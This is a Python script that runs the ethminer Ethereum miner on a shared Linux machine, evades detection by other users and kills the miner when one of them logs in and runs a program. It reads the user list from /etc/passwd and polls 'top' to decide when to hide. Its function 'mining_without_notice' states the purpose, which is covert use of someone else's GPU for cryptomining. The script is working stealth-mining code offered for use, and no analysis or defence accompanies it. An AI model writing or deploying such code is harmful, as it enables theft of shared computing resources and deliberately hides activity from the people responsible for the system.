import os
import signal
import time
import threading
import schedule
import subprocess
import sys
import getpass

mining_is_on = False
miner_process = None

allow_list = ['zsh', 'sftp-server', 'sshd', 'sshdemd', 'sh', 'ssh', 'sftp', 'bash', 'tmux', 'htop', 'watch', 'systemd', '(sd-pam)', \
                'dbus-launch', 'dbus-daemon', 'at-spi-bus-laun', 'at-spi2-registr', 'tcsh', 'mosh-server', 'git-credential-', 'vim']

def get_normal_users():
    rtn = list()
    command_read = os.popen('''
    ## get mini UID limit ##
    l=$(grep "^UID_MIN" /etc/login.defs)

    ## get max UID limit ##
    l1=$(grep "^UID_MAX" /etc/login.defs)

    ## use awk to print if UID >= $MIN and UID <= $MAX   ##
    awk -F':' -v "min=${l##UID_MIN}" -v "max=${l1##UID_MAX}" '{ if ( $3 >= min && $3 <= max ) print $0}' /etc/passwd

    ''').read()
    command_read = command_read.splitlines()
    for line in command_read:
        user = line.split(':')[0]
        rtn.append(user)

    return rtn

def mining_without_notice(mining_url):
    global mining_is_on
    global miner_process

    if mining_is_on:
        threading.Timer(5, mining_without_notice, [mining_url]).start()
    else:
        threading.Timer(30, mining_without_notice, [mining_url]).start()

    this_user = getpass.getuser()
    normal_users = get_normal_users()

    someone_else_detected = False
    top_read = os.popen('top -n 1 -b').read()
    top_read = top_read.splitlines()[7:]
    for line in top_read:
        user_name = line.split()[1]
        status = line.split()[7]
        process = line.split()[11]
        if user_name in normal_users and user_name != this_user:
            if status == 'R' or process not in allow_list: # the process is running
                print('Someone else logins and running!', user_name, process)
                someone_else_detected = True
                if mining_is_on:
                    # kill the miner
                    miner_process.kill()
                    mining_is_on = False

    print('========================================================')
    # open miner
    if someone_else_detected == False and mining_is_on == False:
        print('Open miner!')
        miner_process = subprocess.Popen(['/usr/bin/ethminer', '-G', '-F', mining_url], env=os.environ)
        print('pid =', miner_process.pid)
        mining_is_on = True

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Argument error!')
        sys.exit(-1)
    mining_without_notice(sys.argv[1])
